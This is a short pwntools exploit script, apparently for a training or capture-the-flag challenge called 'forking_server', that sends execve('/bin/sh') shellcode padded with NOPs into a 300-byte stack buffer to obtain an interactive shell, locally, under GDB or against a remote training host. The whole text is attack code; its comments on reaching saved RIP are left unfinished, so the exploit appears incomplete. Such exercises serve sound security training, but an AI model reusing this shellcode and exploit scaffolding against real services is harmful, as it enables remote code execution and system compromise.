from pwn import *

def pad_payload(payload: bytes, target_len: int) -> bytes:
    padding_len = target_len - len(payload)
    return payload + b"\x90" * padding_len

# Your shellcode
s = b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
shellcode = pad_payload(s, 300)  # Match the local_buf[300] size

# Calculate the offset to overwrite saved RIP
# local_buf[300] + saved ebp = 300 + 8 = 308 bytes to reach saved RIP
# But we need the address of our buffer

if args.GDB:
    # For debugging the child process
    COMMANDS = """
    set follow-fork-mode child
    break *main+464
    continue
    """
    p = gdb.debug("./forking_server", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("forking-server.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./forking_server")

# Wait for the banner
p.recvuntil(b"\n\n\n")

# Send the shellcode as the "name"
p.send(shellcode)

p.interactive()